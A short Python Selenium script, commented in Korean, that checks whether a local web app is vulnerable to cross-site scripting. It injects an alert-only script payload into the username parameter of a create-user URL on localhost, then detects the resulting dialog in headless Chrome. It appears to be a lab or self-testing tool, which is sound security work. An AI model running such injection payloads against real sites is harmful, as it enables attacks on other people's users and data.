from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.alert import Alert
from selenium.webdriver.chrome.options import Options
import time

# 실행 2번 해야됨. 1번쨰는 username의 인자값으로 DB를 생성하는 구문이기 때문.

# 셀레니움 브라우저 옵션 설정
options = Options()
options.add_argument("--headless")  # 브라우저 창 안 띄우고 백그라운드로 실행

# 브라우저 드라이버 경로 지정 (네가 깔아놓은 크롬 드라이버 필요)
driver = webdriver.Chrome(options=options)

try:
    # 공격 URL
    payload = "<script>alert('XSS')</script>"
    url = f"http://localhost:8000/create_user/?username={payload}"

    # URL 요청
    driver.get(url)

    # 대기 시간 (페이지 로딩, 스크립트 실행 기다림)
    time.sleep(1)

    # Alert 감지 시도
    alert = Alert(driver)
    alert_text = alert.text
    print(f"[+] Alert detected with message: {alert_text}")
    alert.accept()  # 알림창 닫기
    print("[+] XSS Successful!")

except Exception as e:
    print("[-] No alert detected. XSS not successful.")
    print("[-] Error:", str(e))

finally:
    driver.quit()
